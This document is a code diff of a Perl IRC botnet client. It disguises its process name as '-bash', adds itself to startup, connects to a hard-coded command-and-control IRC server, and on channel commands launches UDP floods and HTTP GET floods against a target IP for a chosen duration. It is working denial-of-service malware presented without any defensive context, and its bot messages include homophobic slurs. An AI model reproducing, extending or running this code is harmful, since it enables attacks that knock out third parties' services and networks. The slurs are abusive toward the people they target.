@@ -12,8 +12,9 @@ addtostartup();
 $0 = "-bash";
 
 #Server IP or hostname, Channel, Serverpassword (nothing if you dont have one)
-my $server      = "irc.bot.net";
-my $channel     = "#bots";
+my $server      = "vypor.net";
+my $channel     = "#bot";
+my $serverport  = "6667";
 my $maxnamechar = "6";
 my $serverpass  = "";
 
@@ -25,7 +26,7 @@ for ( 0 .. $maxnamechar ) { $login .= chr( int( rand(25) + 65 ) ); }
 
 my $sock = new IO::Socket::INET(
     PeerAddr => $server,
-    PeerPort => 6667,
+    PeerPort => $serverport,
     Proto    => 'tcp'
 ) or goto reconnect and print "fag\n";
 
@@ -45,7 +46,7 @@ while ( my $input = <$sock> ) {
     elsif ( $input =~ /^PING(.*)$/i ) {
         print $sock "PONG $1\r\n";
         print "Connected..!\n";
-        print $sock "USER $login 8 * :Perl IRC Hacks Robot\r\n";
+        print $sock "USER $login 8 * :Kawaii Bot\r\n";
         if ( $input =~ /^PING(.*)$/i ) {
             print $sock "PONG $1\r\n";
             print $sock "JOIN $channel\r\n";
@@ -54,46 +55,42 @@ while ( my $input = <$sock> ) {
         last;
     }
 }
+my $user;
+my $host;
+my $chnl;
+my $message;
+
 while (<$sock>) {
     if ( $_ =~ /^PING(.*)$/i ) {
         print $sock "PONG $1\r\n";
     }
     if ( $_ =~ /^:([^!]*)!(\S*) PRIVMSG (#\S+) :(.*)$/ ) {
 
-        my $user    = $1;
-        my $host    = $2;
-        my $chnl    = $3;
-        my $message = $4;
+	$user    = $1;
+	$host    = $2;
+	$chnl    = $3;
+	$message = $4;
 
-        my ( $method, $host, $port, $time, $packetsize, $other ) =
-          split( / /, $message, 6 );
+
+
+my ( $method, $ip, $port, $time, $packetsize, $other ) = split( / /, $message, 6 );
+
 
 #IRC Command Parsing / Sub calling
 
+
+
         if ( $method =~ /^!quit\s*$/ ) {
-            quitme($method);
-        }
+             die "Quitting!\n";
+	}
+	
         if ( $method =~ /^!udp\s*$/ ) {
-            udp( $host, $port, $time, $packetsize );
-        }
-        if ( $method =~ /^!hi\s*$/ ) {
-            HI();
-        }
-        if ( $method =~ /^!httpget\s*$/ ) {
-            httpGET( $host, $port, $time );
-        }
-
-
-#IRC Command Functions
-
-
-        sub udp {
-            my ( $iaddr, $endtime, $psize, $pport );
-        	    $iaddr = inet_aton("$host") or print "Cant find host..\n";
+              my ( $iaddr, $endtime, $psize, $pport );
+        	    $iaddr = inet_aton("$ip") or print "Cant find host..\n";
            	    $endtime = time() + ( $time ? $time : 1000000 );
             	    socket( flood, PF_INET, SOCK_DGRAM, 17 );
             
-		print $sock "PRIVMSG $chnl :Throwing Kittens at: $host for $time seconds\r\n";
+		print $sock "PRIVMSG $chnl :Throwing Kittens at: $ip for $time seconds\r\n";
 
             for ( ; time() <= $endtime ; ) {
                 $psize = $packetsize ? $packetsize : int( rand( 1024 - 64 ) + 64 );
@@ -102,40 +99,33 @@ while (<$sock>) {
                 );
             }
             print $sock "PRIVMSG $chnl :Ran out of kittens...\r\n";
-        }
-
-        sub tcp {
-
-            #Put tcp stuff here. 
-
-        }
-
-        sub quitme {
-            die "Quitting!\n";
-        }
-
-        sub HI {
-            print $sock "PRIVMSG $chnl :Faggot. faggots say hi..\r\n";
-        }
-
-        sub httpGET {
-            print $sock "PRIVMSG $chnl :Starting HTTP-GEEEET Flood.\r\n";
+	}
+	
+	
+        if ( $method =~ /^!hi\s*$/ ) {
+	print $sock "PRIVMSG $chnl :$method $ip $port $packetsize $other";
+	}
+	
+	
+        if ( $method =~ /^!httpget\s*$/ ) {
+		print $sock "PRIVMSG $chnl :Starting HTTP-GEEEET Flood.\r\n";
             my $endtime;
             $endtime = time() + ( $time ? $time : 1000000 );
             for ( ; time() <= $endtime ; ) {
                 my $httpget = IO::Socket::INET->new(
                     Proto    => 'tcp',
-                    PeerAddr => $host,
+                    PeerAddr => $ip,
                     PeerPort => '80',
                 ) or return $!;
                 print $httpget "GET /" . $port . " HTTP/1.0\r\n";
-                print $httpget "Host: ", $host, "\r\n";
+                print $httpget "Host: ", $ip, "\r\n";
                 print $httpget "Connection: close", "\r\n";
                 print $httpget "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "\r\n";
                 print $httpget "Accept: text/html, application/xhtml+xml, */*", "\r\n\r\n";
             }
             print $sock "PRIVMSG $chnl :Finished HTTP-GEEEET Flood.\r\n";
         }
+
 
     }
 }
